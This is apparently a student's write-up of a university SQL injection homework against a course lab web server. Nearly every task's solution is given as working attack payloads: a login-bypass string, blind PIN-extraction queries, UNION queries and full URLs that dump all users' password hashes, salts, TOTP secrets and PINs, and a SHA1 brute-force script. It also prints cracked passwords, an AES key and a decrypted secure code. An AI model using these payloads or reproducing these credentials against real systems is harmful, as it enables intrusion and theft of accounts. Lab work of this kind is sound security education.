# SQL Injection homework

Source code for service under test: https://kbe.felk.cvut.cz/index.php?open=index.php

## Task 1: Login without password
On the main page, there is a login form that you need to pass through, without knowledge of password. As a username use your FEL login name. 
---
solution:

Simply use username: `forstluk';#`.


## Task 2: Find out your PIN
As you can see, your account is not only password-protected, but also PIN-protected. Try to find out your PIN using the vulnerability from the previous task.
---
solution:

We can either bruteforce that, because ther're just 10 000 combinations, or we can be a bit smarter and run iterative queries that indicate partial success on login page (first step when filling usernames.
```

forstluk' and pin like "8%" #

forstluk' and pin like "83%" #

forstluk' and pin like "835%" #

forstluk' and pin like "8352" #

```
So the PIN is `8352`.

## Task 3: Overcome One-Time-Password
PIN-protection didn't stop you? Easy-peasy? Well, try to defeat the next layer of protection - [Time-based One-Time Password](https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm) - widely used industry standard for 2-factor authentication.
---
solution:

Again, by using the first form, we can get the base for OTP like that:

```
forstluk' UNION SELECT secret FROM users WHERE username='forstluk' ORDER BY username; #
```
which gives us seed `F4SZTF6JCSZIUJAS` and we can get OTP here -> https://www.google.com/chart?chs=200x200&chld=M|0&cht=qr&chl=otpauth://totp/kbe?secret=F4SZTF6JCSZIUJAS.


## Task 4: Exfiltrate a list of all usernames, passwords, salts, secrets and pins
Bored of reading secret messages? Let's do some harm. What about exfiltrating all data stored in the database?
---
solution:

Using offset SQL injection, we can obtain whole list like that:
```sql
0 UNION SELECT CONCAT(username, ', ', password, ', ', salt, ', ', secret, ', ', pin), 1 FROM users;
```
so the URL is following:
```
https://kbe.felk.cvut.cz/index.php?offset=0%20UNION%20SELECT%20CONCAT(username,%20%27,%20%27,%20password,%20%27,%20%27,%20salt,%20%27,%20%27,%20secret,%20%27,%20%27,%20pin),%201%20FROM%20users;
```

and the result in form username, password, salt, secret, pin
```
charvj10, 284709bfe4fbf1aefec9482f34bcf03470d078bd, 4f093, HT5MIVD2KADVOGXC, 9748
drimajak, 1fea7f1395fe92eb4cf70f261c54a32a49e94914, c6880, OPWNDPUVYDD2NZ5Z, 8693
forstluk, c95cbbc323b039cbb8594f1e406163a8d8f05fc7, b643c, F4SZTF6JCSZIUJAS, 8352
halasluk, 4484b673dec9e7dcb54f40f752a0bdc830cc294f, 5a1b8, VC63ZKWNJSNBJ36C, 9380
hereldav, b6a69d59dd2313f6d1237f9e34ef68e466a1cdbe, a0c58, UYQ3HCP7Q67OIONB, 3541
hlusijak, 7010fd5fadaef60371cc8a65493aa5c4ac3be6c0, 2e362, 6SJJJGVQ5ZMVX77K, 3142
hruskan1, 4a90c2db5ab816ca36e23bdcfa51201a2fbd7808, 7aac6, QO2WCOGARO2DFLYC, 1496
kadlej24, e3fbf88139050fedaa655160b97000f5a165cacf, 77a32, NKHLS45QURQYUVHB, 1962
landama2, 6537a630a32e92eeec54170e55eae5c11d5f7968, 6a666, WJT3PREACWCFNTV3, 7329
manhaond, 3a59fbb150c725c7eabba452410f2553eb3782e6, c6b72, IQASWFV24KZPCL4I, 4377
mayerja1, 6ce4b86f28d9edc46a73b4a29d772a5174ccd936, 110cf, W5HMGFVHQZAI3IGO, 3937
michap17, 202ea007933f809d4417979f03064025e2edd0d4, 63c9a, LH4R7QBUHF6M4WSO, 1663
outravoj, c73d9bddc004074ab86be659423fbed312da6f13, 2db4b, RDYZT6Q3TPUCY3OV, 2690
purkrmir, 30adf221c75c06db71155f3d1376e972b14c5b03, 30990, 627WTIRH2YR6BUZT, 4933
repamart, e100c06f3a9d3426de2c974448a3ab6cb8b0e247, f75bf, 6VG4QMSVKJFJ7TC2, 7135
sidlovac, 2e4872bde96cffd5aec7b40e1dc51080205e3062, 0c8fb, 5UG2B4SA762B5N2R, 1601
sipekmi2, fd1602b07769c3a774802f0ef2e25f8eee69c5c3, f5254, NHNDJXFKFDNR6NMD, 7634
uhlikfil, c6a63022478e2d28c0a191587ab466db2b3da9d8, 3dad0, IW2PKTDXXHDLMLY5, 1830
vankejan, 27686936e8285f4d5dabf72443356159a89114bc, e2d72, F7ALLHF7DKD6K4VL, 8011
kucerkr1, 476c77fbd5ada79d1cde60dcec29da504d66e5bc, cf50f, 2FWOJFMVDECP5LCJ, 3610
```

## Task 5: Crack your password hash
Do you want to be able to login as a regular user? Well, then you need to know your password in addition to your PIN and SECRET. Passwords of student accounts are [hashed](https://en.wikipedia.org/wiki/Cryptographic_hash_function) and [salted](https://en.wikipedia.org/wiki/Salt_(cryptography)) in the following [inappropriate](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#password-hashing-algorithms) way: `sha1($password . $salt)`, where $password is five characters long string consisting of lowercase letters and numbers. Write a script trying all possible combinations.
---
solution:

We know the length (5 characters) and the alphabet, it should not be hard to cract that.

```python
import hashlib
import string

password_hash = "c95cbbc323b039cbb8594f1e406163a8d8f05fc7"
salt = "b643c"

alphabet = string.ascii_lowercase + string.digits


def run_next(password):
    if len(password) < 5:
        for char in alphabet:
            if run_next(f"{password}{char}"):
                return True
    else:
        hashed = f"{password}{salt}"
        if hashlib.sha1(hashed.encode()).hexdigest() == password_hash:
            print(f"Password found! - {password}")
            return True

    return False


if __name__ == '__main__':
    if not run_next(""):
        print("No password found!")
```
Password for `forstluk` is `1488a`.


## Task 6: Crack teacher's password hash
---
solution:

We know that the teacher is this record in the previous database:
```
komartom, 2d55131b6752f066ee2cc57ba8bf781b4376be85, kckct, OQEBJKRVXKJIWBOC, 7821
```
Because we know (from the service's code - putting salt as suffix) how it hashes passwords and we know salt (`kckct`) we can simply use https://www.dcode.fr/sha1-hash and crack the password! Result is `fm9fytmf7q`.


## Task 7: Explain why teacher's password is insecure despite its length
---
Contains only numbers and lowercase letters and in combination with fast hashing function and leaked salt, it's easy to crack.

## Task 8: Print a list of all table names and their columns in `kbe` database
---
solution:
This one is a bit tricky, but we can again reuse offset vulnerability with SQL:
```sql
0 UNION SELECT CONCAT(cs.TABLE_NAME, ' - ', cs.COLUMN_NAME), 1 FROM INFORMATION_SCHEMA.COLUMNS cs LEFT JOIN INFORMATION_SCHEMA.TABLES tb ON cs.TABLE_NAME = tb.TABLE_NAME WHERE tb.TABLE_TYPE='BASE TABLE';
```
and then the request is:
```
https://kbe.felk.cvut.cz/index.php?offset=0 UNION SELECT CONCAT(cs.TABLE_NAME, ' - ', cs.COLUMN_NAME), 1 FROM INFORMATION_SCHEMA.COLUMNS cs LEFT JOIN INFORMATION_SCHEMA.TABLES tb ON cs.TABLE_NAME = tb.TABLE_NAME WHERE tb.TABLE_TYPE='BASE TABLE';

```
So the result:
```
codes - username
codes - aes_encrypt_code

messages - username
messages - base64_message_xor_key
messages - date_time

users - username
users - password
users - pin
users - secret
users - salt
```

## Task 9: Derive xor key used for encoding your messages
---
solution:
The key here is that we can see how the application builds the xor key.
```php
function xor_key($username, $pattern = "kbe_REPLACE_xor_key_2021", $len = 4) {
    return str_replace("REPLACE", substr(sha1($username . $pattern), 0, $len), $pattern); 
}
```
So, I just take my own data and feed it to python
```python
hashlib.sha1("forstlukkbe_REPLACE_xor_key_2021".encode()).hexdigest()[:4]
```
which gives me `021a`.


## [BONUS :hurtrealbad:] Task 10: Find out key used for encoding secure codes
---
As previously stated, we have access to the code, and the key is there as well
```php
define("AES_ENCRYPT_CODE_KEY", "iHw35UKAPaSYKf8SI44CwYPa");

```

## [BONUS :feelsgood:] Task 11: Steal Martin Rehak's secure code
---
Interestingly, Mr. Rehak is not a user of the system as we didn't find his name in the exflitrated table with users. However, in order to steal the secure code, we need to decrypt `aes_encrypt_code` which is in the table `codes`. So if this task should be possible the code and the suername should be there. 
```sql
0 UNION SELECT aes_encrypt_code, 1 FROM codes c where c.username like 'rehakmar';
```
So the request:
```
https://kbe.felk.cvut.cz/index.php?offset=0%20UNION%20SELECT%20aes_encrypt_code,%201%20FROM%20codes%20c%20where%20c.username%20like%20%27rehakmar%27;
```
as the result we can see the `aes_encrypt_code = E3BCC1C2ACBDA02B07A04D576ED0BE9DE52286F0102DD8DC83BC839790862352`.

We also know how the application processes the codes:
```php
$code = q("SELECT AES_DECRYPT(UNHEX(aes_encrypt_code), '" . e(AES_ENCRYPT_CODE_KEY) . "') AS code FROM codes WHERE username = '" . e($_SESSION["username"]) . "'")->fetch_assoc()["code"];
```
So we can again query database like that:
```sql
0 UNION SELECT AES_DECRYPT(UNHEX(aes_encrypt_code), "iHw35UKAPaSYKf8SI44CwYPa"), 1 FROM codes c where c.username = "rehakmar";

```
So the request:
```
https://kbe.felk.cvut.cz/index.php?offset=0%20UNION%20SELECT%20AES_DECRYPT(UNHEX(aes_encrypt_code),%20%22iHw35UKAPaSYKf8SI44CwYPa%22),%201%20FROM%20codes%20c%20where%20c.username%20=%20%22rehakmar%22;
```
And the result -> `scorpion-ask-milk-sunny`.